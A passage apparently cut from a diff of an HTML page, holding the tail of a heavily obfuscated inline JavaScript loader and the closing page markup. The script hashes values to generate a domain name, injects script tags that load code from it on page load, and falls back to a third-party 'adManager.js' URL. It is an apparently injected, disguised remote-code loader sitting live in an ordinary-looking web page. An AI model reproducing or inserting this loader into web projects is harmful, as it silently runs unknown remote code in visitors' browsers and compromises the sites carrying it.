=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
